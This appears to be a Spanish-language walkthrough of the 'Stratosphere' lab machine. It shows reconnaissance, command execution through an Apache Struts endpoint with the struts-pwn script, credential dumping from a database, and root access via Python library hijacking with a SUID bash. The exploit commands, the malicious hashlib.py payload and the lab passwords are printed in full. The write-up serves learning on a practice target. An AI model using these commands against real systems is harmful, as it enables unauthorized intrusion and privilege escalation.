-----------------
- Tags: #Linux #action #python_library_hijacking
-----------------

![[Pasted image 20240923224954.png]]
# RECONOCIMIENTO

- Hacemos `ping` a la ip victima para ver contra que tipo de sistema nos estamos enfrentando

```bash
ping -c 1 10.10.10.64
PING 10.10.10.64 (10.10.10.64) 56(84) bytes of data.
64 bytes from 10.10.10.64: icmp_seq=1 ttl=63 time=42.2 ms

--- 10.10.10.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.152/42.152/42.152/0.000 ms
```

Como podemos ver nos estamos enfrentando a una maquina `Linux`, esto lo sabemos por su valor `63` de `ttl`.

- Realizamos un escaneo de puertos abiertos en la maquina

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.64 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 19:57 UTC
Initiating SYN Stealth Scan at 19:57
Scanning 10.10.10.64 [65535 ports]
Discovered open port 80/tcp on 10.10.10.64
Discovered open port 22/tcp on 10.10.10.64
Discovered open port 8080/tcp on 10.10.10.64
Completed SYN Stealth Scan at 19:58, 39.49s elapsed (65535 total ports)
Nmap scan report for 10.10.10.64
Host is up, received user-set (0.042s latency).
Scanned at 2024-09-23 19:57:37 UTC for 40s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.59 seconds
           Raw packets sent: 196630 (8.652MB) | Rcvd: 34 (1.496KB)
```

Como podemos ver tenemos los puertos `22, 80, 8080` abiertos dentro de la maquina por lo que vamos a ver que servicios tienen por detrás corriendo dichos puertos.

- Escaneo exhaustivo de puertos

```bash
nmap -p22,80,8080 -sCV 10.10.10.64 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 19:59 UTC
Nmap scan report for 10.10.10.64
Host is up (0.051s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495651"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Mon, 23 Sep 2024 20:00:02 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Mon, 23 Sep 2024 20:00:02 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1874
|     Date: Mon, 23 Sep 2024 20:00:02 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or decept
|_http-title: Stratosphere
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495651"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Mon, 23 Sep 2024 20:00:02 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Mon, 23 Sep 2024 20:00:02 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1874
|     Date: Mon, 23 Sep 2024 20:00:02 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or decept
|_http-title: Stratosphere
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=9/23%Time=66F1C8C2%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:
SF:\x20W/\"1708-1519762495651\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x20
SF:2018\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length
SF::\x201708\r\nDate:\x20Mon,\x2023\x20Sep\x202024\x2020:00:02\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20
SF:\x20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosphe
SF:re</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/
SF:css\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"backgroun
SF:d\"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x2
SF:0<div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-
SF:wrap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></
SF:i></p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<a\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>
SF:\n\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div
SF:>\n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"c
SF:ontainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\
SF:x20\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h
SF:1>\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarte
SF:d\.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20c
SF:lass=\"ar")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20OPTIONS
SF:,\x20GET,\x20HEAD,\x20POST\r\nContent-Length:\x200\r\nDate:\x20Mon,\x20
SF:23\x20Sep\x202024\x2020:00:02\x20GMT\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,7EE,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;c
SF:harset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201874\r\nD
SF:ate:\x20Mon,\x2023\x20Sep\x202024\x2020:00:02\x20GMT\r\nConnection:\x20
SF:close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x
SF:20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type
SF:=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20
SF:h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{fo
SF:nt-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x2
SF:0p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px
SF:;background-color:#525D76;border:none;}</style></head><body><h1>HTTP\x2
SF:0Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"lin
SF:e\"\x20/><p><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x20
SF:Invalid\x20character\x20found\x20in\x20the\x20HTTP\x20protocol</p><p><b
SF:>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pro
SF:cess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perce
SF:ived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20r
SF:equest\x20syntax,\x20invalid\x20request\x20message\x20framing,\x20or\x2
SF:0decept");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=9/23%Time=66F1C8C2%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETa
SF:g:\x20W/\"1708-1519762495651\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x
SF:202018\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Leng
SF:th:\x201708\r\nDate:\x20Mon,\x2023\x20Sep\x202024\x2020:00:02\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x
SF:20\x20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosp
SF:here</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"tex
SF:t/css\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"backgro
SF:und\"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\
SF:x20<div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"conten
SF:t-wrap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\">
SF:</i></p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<a\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</
SF:a>\n\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</d
SF:iv>\n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\
SF:"container\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x2
SF:0\x20\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.<
SF:/h1>\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStar
SF:ted\.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x2
SF:0class=\"ar")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20OPTIO
SF:NS,\x20GET,\x20HEAD,\x20POST\r\nContent-Length:\x200\r\nDate:\x20Mon,\x
SF:2023\x20Sep\x202024\x2020:00:02\x20GMT\r\nConnection:\x20close\r\n\r\n"
SF:)%r(RTSPRequest,7EE,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html
SF:;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201874\r\
SF:nDate:\x20Mon,\x2023\x20Sep\x202024\x2020:00:02\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP
SF:\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20ty
SF:pe=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x
SF:20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{
SF:font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\
SF:x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1
SF:px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP\
SF:x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"l
SF:ine\"\x20/><p><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x
SF:20Invalid\x20character\x20found\x20in\x20the\x20HTTP\x20protocol</p><p>
SF:<b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20p
SF:rocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20per
SF:ceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x2
SF:0request\x20syntax,\x20invalid\x20request\x20message\x20framing,\x20or\
SF:x20decept");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Como podemos observar tenemos el servicio de `ssh` corriendo, pero como de momento no tenemos credenciales validas para este no podremos hacer nada, luego tenemos un servicio `http` en el puerto `80` y otro `http` en el puerto `8080`, por lo que vamos a empezar a hacer un reconocimiento web para ver si podemos sacar algo de información.

----------------------------
# RECONOCIMIENTO WEB

- De primeras lo que vamos a realizar es un escaneo a las dos `url` que tienen un servicio `http` corriendo, tanto a la `http://10.10.10.64:80` como a la `http://10.10.10.64:8080`, por lo que vamos a ver que es lo que nos devuelve nuestro escaneo en ambas

```bash
whatweb http://10.10.10.64:80
http://10.10.10.64:80 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
```

Output de la segunda

```bash
whatweb http://10.10.10.64:8080
http://10.10.10.64:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
```

Por lo que estamos viendo, ni en el puerto `80` ni en el `8080` nos devuelve nada interesante, por lo que lo que yo haría seria indagar un poco dentro de ambas webs a ver si podemos ver algo interesante

![[Pasted image 20240923220609.png]]

Tanto una web como la otra son dos clones idénticos, lo que se me hace un poco extraño, en este punto seguiría enumerando pero ahora haciendo un poco de `Fuzzing` para ver si podemos encontrar algún tipo de directorio oculto o archivo que podamos usar posteriormente.

- Fuzzing de directorios

```bash
gobuster dir -u http://10.10.10.64:80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.64:80/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manager              (Status: 302) [Size: 0] [--> /manager/]
/Monitoring           (Status: 302) [Size: 0] [--> /Monitoring/]
```

Encontramos dos rutas, `/manager` que a la hora de ponerla nos pide credenciales por lo que podemos probar con las típicas pero vamos a ver que no va a funcionar por lo que hasta que no tengamos algun tipo de credencial no probaremos con esta, y luego tenemos la ruta `/Monitoring` que nos redirige a la siguiente web:

![[Pasted image 20240923221116.png]]

**Lo primero que vemos interesante en esta web es el archivo que nos devuelve al final de la ruta, `Welcome.action`, si indagamos un poco sobre archivos `.action` podemos ver que son archivos `Java` que están asociados a un `framework` llamado `Struts`, en resumen, los archivos `.action` no son archivos en si, sino que son parte de las URL utilizadas en aplicaciones web Java que usan frameworks somo Struts. Estas URL mapean las solicitudes a clases especificas que contienen la lógica de negocio para manejar la solicitud.**

----------------------------------------------
# EXPLOTACION DE STRUTS

Si buscamos `exploit strtus github` en Google encontramos el siguiente repositorio que vamos a utilizar para poder explotar dicha vulnerabilidad: [REPOSITORIO](https://github.com/mazen160/struts-pwn)

- Uso del exploit

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'id'
```

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'id'

[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
```

Como podemos ver tenemos ejecución remota de comandos, por lo que el siguiente paso seria  entablarnos una `reverse-shell` en nuestro sistema para poder trabajar de forma mas cómoda, pero ya os adelanto que no se puede por lo que nos toca un poco de enumeración del sistema ejecutando comandos con el script anterior.

-----------------------

# OTENCION DE TTY A TRAVES DE CREDENCIALES SSH

- Reconocimiento básico del sistema

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'ls -la'

[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
[*] CMD: ls -la
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

total 24
drwxr-xr-x  5 root    root    4096 Sep 23 15:11 .
drwxr-xr-x 46 root    root    4096 Dec  3  2023 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Sep 23 15:11 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8

[%] Done.
```

Como podemos ver de primeras se nos otorga un archivo bastante interesante llamado `db_connect` por lo que vamos a ver que es lo que contiene

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'cat db_connect'

[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
[*] CMD: cat db_connect
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

[%] Done.
```

Obtenemos varias credenciales y por lo que parecen ser son para poder autenticarnos en una base de datos `mysql`, lo que pasa en este punto es que nosotros no podemos lanzar el tipico comando de `mysql -u user -p password` porque no tenemos una consola interactiva, por lo que nos devolvería un error, por lo que vamos a utilizar `mysqlshow` que es una alternativa para poder ver tanto las bases de datos como las tablas de estas para luego posteriormente hacer una consulta ya con el comando `mysql`

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin'
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| users              |
+--------------------+

[%] Done.
```

- Vemos las tablas dentro de la base de datos users

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users'
Database: users
+----------+
|  Tables  |
+----------+
| accounts |
+----------+

[%] Done.
```

Una vez que sabemos las tablas y la base de datos ya lo que queda es hacer la consulta con `mysql` para ver todos los datos

```bash
python2.7 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysql -uadmin -padmin -e "select * from accounts" users'
fullName	password	username
Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard

[%] Done.
```

Como podemos ver nos devuelve un `user richard` y una `password:9tc*rhKuG5TyXvUJOrE^5CK7k`, por lo que lo que yo haría en este punto es probar estas credenciales con `ssh` para intentar conectarnos y entablar una shell interactiva en nuestra maquina

----------------------

# SHELL COMO RICHARD

```bash
ssh richard@10.10.10.64
richard@10.10.10.64's password: 
Linux stratosphere 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 23 16:32:01 2024 from 10.10.16.13
richard@stratosphere:~$ 
```

-----------------------
# ESCALADA DE PRIVILEGIOS A ROOT

- Reconocimiento básico

```bash
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

Como vemos podemos ejecutar con permisos de sudo el siguiente comando `/usr/bin/python* /home/richard/test.py`, este script de Python se encuentra en nuestro directorio pero no podemos editarlo debido a que tiene la flag inmute.

En este caso lo que yo haría seria un `Python Library Hijacking`, que consiste en que `python` a la hora de cargar las librerías, las busca en el `path` pero de primeras lo que hace es buscarlas en el directorio de trabajo actual, por lo que si creamos un archivo malicioso con el mismo nombre del archivo de la librería que intente cargar el script, lo que conseguiremos en este caso es cambiar los permisos de la bash y así acceder como usuario root al sistema y tener el control total.

- POC:

```bash
richard@stratosphere:~$ cat test.py
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

Vemos que la librería que intenta cargar al inicio es `hashlib`, por lo que vamos a ver como se llama el fichero de la libreria `hashlib`

```bash
richard@stratosphere:~$ find / -name "*hashlib*" 2>/dev/null
/usr/lib/python3.5/__pycache__/hashlib.cpython-35.pyc
/usr/lib/python3.5/lib-dynload/_hashlib.cpython-35m-x86_64-linux-gnu.so
/usr/lib/python3.5/hashlib.py
/usr/lib/python2.7/lib-dynload/_hashlib.x86_64-linux-gnu.so
/usr/lib/python2.7/hashlib.py
/usr/lib/python2.7/hashlib.pyc
/usr/lib/python3.7/__pycache__/hashlib.cpython-37.pyc
/usr/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so
/usr/lib/python3.7/hashlib.py
```

Una vez que hemos confirmado que el archivo se llama `hashlib.py` lo unico que tenemos que hacer es crearnos un archivo malicioso con ese nombre que contenga lo siguiente

```bash
import os

os.system("chmod u+s /bin/bash")
```

- Obtención de permisos `suid` para la bash

```bash
richard@stratosphere:~$ sudo -u root /usr/bin/python3 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
^CTraceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 6, in question
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
KeyboardInterrupt
```

```bash
richard@stratosphere:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

- Por ultimo hacemos lo siguiente para tener una bash con privilegios

```bash
richard@stratosphere:~$ bash -p
bash-5.0# whoami
root
```